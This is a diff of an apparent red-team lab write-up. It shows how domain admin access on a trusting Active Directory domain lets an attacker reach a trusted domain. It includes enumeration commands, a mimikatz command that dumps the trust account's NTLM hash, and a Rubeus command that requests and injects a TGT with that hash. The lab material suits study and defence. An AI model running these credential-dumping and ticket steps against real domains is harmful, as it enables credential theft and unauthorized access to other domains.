@@ -1,4 +1,4 @@
-# Abusing Trust Account$: From Trusting Domain to Trusted Domain
+# Abusing Trust Account$: Accessing Resources on Trusted Domain from Trusting Domain
 
 This is a quick lab to familiarize with a technique that allows accessing resources on a trusted domain from a fully compromised (Domain admin privileges achieved) trusting domain, by recovering the trusting `account$` (that's present on the trusted domain) password hash.
 
@@ -36,10 +36,14 @@ Confirm the trust relationships between domains:
 get-adtrust -filter *
 ```
 
+![](<../../.gitbook/assets/image (1092).png>)
+
 ```
 # on second-dc.second.local
 get-adtrust -filter *
 ```
+
+![](<../../.gitbook/assets/image (1089).png>)
 
 Confirm that there's a trust account `second$` on `first.local` domain:
 
@@ -48,23 +52,29 @@ Confirm that there's a trust account `second$` on `first.local` domain:
 get-aduser 'second$'
 ```
 
-Confirm that we can enumerate resources on the trusting domain second.local from first.local:
+![](<../../.gitbook/assets/image (1094).png>)
+
+Confirm that we can enumerate resources on the trusting domain `second.local` from `first.local`:
 
 ```
 # from first-dc.first.local
 get-aduser -Filter * -Server second.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
 ```
 
-Confirm that we cannot enumerate resources on the trusted domain first.local from the trusting domain second.local:
+![](<../../.gitbook/assets/image (1085).png>)
+
+Confirm that we cannot (just yet, but this is soon to change) enumerate resources on the trusted domain `first.local` from the trusting domain :
 
 ```
 # on second-dc.second.local
 get-aduser -Filter * -Server first.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
 ```
 
+![](<../../.gitbook/assets/image (1091).png>)
+
 ## Compromising Trust Account first.local\second$
 
-As mentioned earlier, the main crux of the technique is that we're able to compromise the trust account `first.local\second$` if we have domain admin access on `second.local`.
+As mentioned earlier, the main crux of the technique is that we're able to compromise the trust account `first.local\second$` if we have domain admin privileges on `second.local`.
 
 To compromise the `first.local\second$` and reveal its password hash, we can use mimikatz like so:
 
@@ -73,7 +83,9 @@ To compromise the `first.local\second$` and reveal its password hash, we can use
 mimikatz.exe "lsadump::trust /patch" "exit"
 ```
 
-Note the RC4 hash in \[out] first.local -> second.local line - this is the NTLM hash for `first.local\second$`, capture it.
+![](<../../.gitbook/assets/image (1093).png>)
+
+Note the RC4 hash in \[out] `first.local` -> `second.local` line - this is the NTLM hash for `first.local\second$`, capture it.
 
 ## Requesting TGT for first.local\second$
 
@@ -84,13 +96,17 @@ Once we have the NTLM hash for `first.local\second$`, we can request its TGT fro
 Rubeus.exe asktgt /user:second$ /domain:first.local /rc4:24b07e26ca7affb4ac061f6920cb57ec /nowrap /ptt
 ```
 
+![](<../../.gitbook/assets/image (1095).png>)
+
 ## Accessing Resources on First.local from Second.local
 
-At this point on `second-dc.second.local`, we have a TGT for `first.local\second$` committed to memory and we can now start enumerating resources on `first.local`:
+At this point on `second-dc.second.local`, we have a TGT for `first.local\second$` committed to memory and we can now start enumerating resources on `first.local` - and this concludes the technique, showing that it's possible to access resources on a trusted domain (as a low privileged user), given  the trusting domain is compromised:
 
 ```
 Get-ADUser roast.user -Server first.local -Properties * | select samaccountname, serviceprincipalnames
 ```
+
+![](<../../.gitbook/assets/image (1090).png>)
 
 ## References
 
